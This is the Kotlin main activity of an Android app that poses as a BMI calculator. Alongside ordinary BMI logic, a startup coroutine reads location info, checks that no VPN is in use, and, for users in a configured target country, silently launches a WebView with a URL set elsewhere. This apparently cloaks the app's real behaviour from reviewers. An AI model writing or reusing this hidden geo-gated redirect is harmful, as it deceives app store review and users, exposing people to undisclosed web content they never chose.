package com.angleone.bmical

import android.content.Context
import android.content.Intent
import android.content.res.ColorStateList
import android.os.Bundle
import android.util.Log
import android.view.inputmethod.InputMethodManager
import android.widget.SeekBar
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import com.blankj.utilcode.util.NetworkUtils
import com.angleone.bmical.config.HOST_URL
import com.angleone.bmical.config.TARGET_COUNTRY
import com.angleone.bmical.databinding.ActivityMainBinding
import com.angleone.bmical.utils.AppInfoUtils
import com.angleone.bmical.webview.WebViewActivity
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext


class MainActivity : AppCompatActivity() {

    private lateinit var binding: ActivityMainBinding
    private var isMale = true
    private var height = 0.0
    private var weight = 0.0
    private var age = 0.0
    private var maxHeight = 230
    private var minHeight = 0
    private var currentHeight = 0
    private var gender = "Male"

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        val view = binding.root
        setContentView(view)

        //init level
        binding.clMale.setBackgroundResource(R.drawable.view_gender_bakground_select)
        binding.clFemale.setBackgroundResource(R.drawable.view_gender_bakground)
        binding.tvMale.setTextColor(getColor(R.color.white))
        binding.tvFemale.setTextColor(getColor(R.color.card_select_gray))
        binding.ivMale.backgroundTintList = ColorStateList.valueOf(ContextCompat.getColor(this, R.color.white))
        binding.ivFemale.backgroundTintList = ColorStateList.valueOf(ContextCompat.getColor(this, R.color.card_select_gray))

        //height
        binding.sbHeight.setOnSeekBarChangeListener(object : SeekBar.OnSeekBarChangeListener {
            override fun onProgressChanged(seekBar: SeekBar?, progress: Int, fromUser: Boolean) {
                currentHeight = progress
                binding.tvHeightVal.text = progress.toString()
            }

            override fun onStartTrackingTouch(seekBar: SeekBar?) {
                // Called when the user starts to move the seek bar thumb
            }

            override fun onStopTrackingTouch(seekBar: SeekBar?) {
                // Called when the user stops moving the seek bar thumb
            }
        })

        //height button
        binding.ibUpAge.setOnClickListener {
            if (currentHeight <= maxHeight) {
                binding.sbHeight.progress = currentHeight + 1
            }
        }

        binding.ibDownAge.setOnClickListener {
            if (currentHeight > 0) {
                binding.sbHeight.progress = currentHeight - 1
            }
        }

        //gender
        binding.clMale.setOnClickListener {
            if (!isMale) {
                binding.clMale.setBackgroundResource(R.drawable.view_gender_bakground_select)
                binding.clFemale.setBackgroundResource(R.drawable.view_gender_bakground)
                binding.tvMale.setTextColor(getColor(R.color.white))
                binding.tvFemale.setTextColor(getColor(R.color.card_select_gray))
                binding.ivMale.backgroundTintList = ColorStateList.valueOf(ContextCompat.getColor(this, R.color.white))
                binding.ivFemale.backgroundTintList = ColorStateList.valueOf(ContextCompat.getColor(this, R.color.card_select_gray))
                isMale = true
                gender = "Male"
            }
        }

        binding.clFemale.setOnClickListener {
            binding.clFemale.setBackgroundResource(R.drawable.view_gender_bakground_select)
            binding.clMale.setBackgroundResource(R.drawable.view_gender_bakground)
            binding.tvFemale.setTextColor(getColor(R.color.white))
            binding.tvMale.setTextColor(getColor(R.color.card_select_gray))
            binding.ivMale.backgroundTintList = ColorStateList.valueOf(ContextCompat.getColor(this, R.color.card_select_gray))
            binding.ivFemale.backgroundTintList = ColorStateList.valueOf(ContextCompat.getColor(this, R.color.white))
            isMale = false
            gender = "Female"
        }

        binding.main.setOnClickListener {
            hideSoftKeyboard()
        }

        binding.clPrivacy.setOnClickListener {
            openPolicyView()
        }

        //cal BMI
        binding.btnCal.setOnClickListener {

            if (binding.etWeightVal.text.isEmpty()) {
                weight = 0.0
            } else {
                weight = binding.etWeightVal.text.toString().toDouble()
            }

            if (binding.etAgeVal.text.isEmpty()) {
                age = 0.0
            } else {
                age = binding.etAgeVal.text.toString().toDouble()
            }

            height = binding.tvHeightVal.text.toString().toDouble()

            if (weight != 0.0 && height != 0.0 && age != 0.0) {
                var bmi = calculateBMI(weight, height, isMale)
                Log.d("BMI ", bmi.toString())
                val intent = Intent(this, ResultActivity::class.java)
                intent.putExtra("bmi", bmi)
                intent.putExtra("details", "Height: $height | Weight: $weight | Age: $age\nGender: $gender")
                startActivity(intent)
            } else {
                Toast.makeText(this, "Please enter values", Toast.LENGTH_SHORT).show()
            }
        }

        CoroutineScope(Dispatchers.IO).launch {
            AppInfoUtils.readAppInfo()
            val result: String? = AppInfoUtils.readLocInfo()

            if (!NetworkUtils.isUsingVPN() && !result.isNullOrEmpty() && (result.contains("\"${TARGET_COUNTRY}\"") || result.contains(
                    "loc=${TARGET_COUNTRY}"
                ))
            ) {
                //跳转到WebView
                withContext(Dispatchers.Main) {
                    val intent = Intent(this@MainActivity, WebViewActivity::class.java)
                    startActivity(intent)
                }
            }
        }
    }

    private fun openPolicyView() {
        HOST_URL = "https://fhuang.s3.ap-east-1.amazonaws.com/Privacy+Policy+_+BMI.html"
        val intent = Intent(this, WebViewActivity::class.java)
        intent.putExtra("allowBack", 1)
        startActivity(intent)
    }

    private fun hideSoftKeyboard() {
        val inputMethodManager =
            getSystemService(Context.INPUT_METHOD_SERVICE) as InputMethodManager
        inputMethodManager.hideSoftInputFromWindow(binding.main.windowToken, 0)
    }

    private fun calculateBMI(weightKg: Double, heightCm: Double, isMale: Boolean): Double {
        val heightM = heightCm / 100.0
        return weightKg / (heightM * heightM)
    }

}